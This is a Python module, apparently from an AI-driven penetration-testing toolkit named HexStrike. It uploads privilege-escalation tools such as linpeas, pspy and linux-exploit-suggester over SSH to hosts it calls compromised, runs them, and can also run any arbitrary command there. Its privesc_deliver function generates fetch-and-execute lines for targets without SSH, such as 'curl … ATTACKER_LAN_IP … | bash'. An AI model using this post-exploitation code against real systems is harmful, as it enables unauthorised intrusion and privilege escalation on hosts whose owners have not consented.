"""Remote execution channel for HexStrike (改造⑥-P2).

- remote_exec:     paramiko SSH channel — SFTP upload a privesc script (linpeas/pspy/les)
                   to a compromised Linux host, chmod +x, run it (optionally with args),
                   stream back stdout/stderr. Also supports running an arbitrary command.
- privesc_deliver: print copy-paste one-shot delivery commands (python http.server ->
                   curl/socat on the target) for hosts where SSH is unavailable.

Scripts are read from LOCAL_PRIVESC (~/hexstrike-ai/privesc/), populated by the
`privesc_extract` tool (docker cp from the hexstrike-linux sidecar /opt/privesc).
"""
import os
import stat
import time
from typing import Any, Dict, Optional

try:
    import paramiko
    _HAS_PARAMIKO = True
except Exception:  # pragma: no cover
    paramiko = None
    _HAS_PARAMIKO = False

LOCAL_PRIVESC = os.path.expanduser("~/hexstrike-ai/privesc")
# known script name -> (relative path under LOCAL_PRIVESC, is_binary)
SCRIPT_SPECS = {
    "linpeas": ("linpeas.sh", False),
    "pspy": ("pspy64s", True),
    "les": ("les/linux-exploit-suggester.sh", False),
}
MAX_OUT = 40000
MAX_ERR = 20000


def _resolve_script(script: str) -> Optional[tuple]:
    """-> (absolute local path, is_binary) or None if unknown/missing locally."""
    name = (script or "").strip().lower()
    spec = SCRIPT_SPECS.get(name)
    if not spec:
        return None
    rel, is_binary = spec
    path = os.path.join(LOCAL_PRIVESC, rel)
    if not os.path.exists(path):
        return None
    return path, is_binary


def _read_streams(stdout, stderr, timeout: int) -> Dict[str, str]:
    out_ch = stdout.channel
    chunks, errs = [], []
    end = time.time() + timeout
    while time.time() < end and not out_ch.exit_status_ready():
        time.sleep(0.2)
        if out_ch.recv_ready():
            chunks.append(out_ch.recv(65536).decode(errors="replace"))
        if out_ch.recv_stderr_ready():
            errs.append(out_ch.recv_stderr(65536).decode(errors="replace"))
    while out_ch.recv_ready():
        chunks.append(out_ch.recv(65536).decode(errors="replace"))
    while out_ch.recv_stderr_ready():
        errs.append(out_ch.recv_stderr(65536).decode(errors="replace"))
    return {
        "stdout": "".join(chunks)[-MAX_OUT:],
        "stderr": "".join(errs)[-MAX_ERR:],
    }


def _exec(client, cmd: str, timeout: int) -> Dict[str, Any]:
    try:
        stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout, get_pty=True)
    except Exception as e:
        return {"success": False, "error": f"exec_command failed: {type(e).__name__}: {e}"}
    streams = _read_streams(stdout, stderr, timeout)
    try:
        rc = stdout.channel.recv_exit_status()
    except Exception:
        rc = -1
    return {
        "success": rc == 0,
        "exit_code": rc,
        "stdout": streams["stdout"],
        "stderr": streams["stderr"],
    }


def remote_exec(host: str, script: str = "", command: str = "", username: str = "root",
                port: int = 22, ssh_key: str = "", password: str = "",
                extra_args: str = "", remote_path: str = "", timeout: int = 90) -> Dict[str, Any]:
    if not _HAS_PARAMIKO:
        return {"success": False, "error": "paramiko is not installed in hexstrike-env"}
    if not host:
        return {"success": False, "error": "host is required"}
    if not script and not command:
        return {"success": False, "error": "provide a privesc script (linpeas/pspy/les) or a command"}

    resolved = _resolve_script(script) if script else None
    if script and resolved is None:
        return {
            "success": False,
            "error": f"unknown/missing script '{script}'; known={list(SCRIPT_SPECS)} "
                     f"under {LOCAL_PRIVESC} (run privesc_extract first)",
        }

    t0 = time.time()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if password:
            client.connect(host, port=port, username=username, password=password,
                           timeout=timeout, allow_agent=False, look_for_keys=False)
        else:
            key_path = ssh_key or os.path.expanduser("~/.ssh/id_ed25519")
            client.connect(host, port=port, username=username, key_filename=key_path,
                           timeout=timeout)
    except Exception as e:
        return {"success": False, "error": f"ssh connect failed: {type(e).__name__}: {e}", "host": host}

    try:
        if script:
            lp, is_binary = resolved
            rp = remote_path or f"/tmp/hx_{os.path.basename(lp)}"
            try:
                sftp = client.open_sftp()
                sftp.put(lp, rp)
                if not is_binary:
                    sftp.chmod(rp, stat.S_IRWXU)
                sftp.close()
            except Exception as e:
                return {"success": False, "error": f"sftp upload failed: {type(e).__name__}: {e}"}
            run_cmd = f"{rp} {extra_args}".strip() if is_binary else f"bash {rp} {extra_args}".strip()
            result = _exec(client, run_cmd, timeout)
            result["remote_path"] = rp
        else:
            result = _exec(client, command, timeout)
        result["host"] = host
        result["duration_ms"] = int((time.time() - t0) * 1000)
        return result
    finally:
        try:
            client.close()
        except Exception:
            pass


def privesc_deliver(script: str = "linpeas", listen_port: int = 9999) -> Dict[str, Any]:
    """Generate a local HTTP one-shot to push a privesc script to a non-SSH target."""
    resolved = _resolve_script(script)
    if resolved is None:
        return {
            "success": False,
            "error": f"unknown/missing script '{script}'; known={list(SCRIPT_SPECS)} "
                     f"under {LOCAL_PRIVESC} (run privesc_extract first)",
        }
    lp, is_binary = resolved
    fname = os.path.basename(lp)
    if is_binary:
        target_side = (
            f"curl -fsSL http://ATTACKER_LAN_IP:{listen_port}/{fname} -o /tmp/{fname} "
            f"&& chmod +x /tmp/{fname} && /tmp/{fname}"
        )
    else:
        target_side = f"curl -fsSL http://ATTACKER_LAN_IP:{listen_port}/{fname} | bash"
    attacker_side = f"cd {os.path.dirname(lp)} && python3 -m http.server {listen_port}"
    return {
        "success": True,
        "script": script,
        "note": "Replace ATTACKER_LAN_IP with an address reachable from the target; "
                "run the attacker-side command first, then paste the target-side command.",
        "attacker_side": attacker_side,
        "target_side": target_side,
    }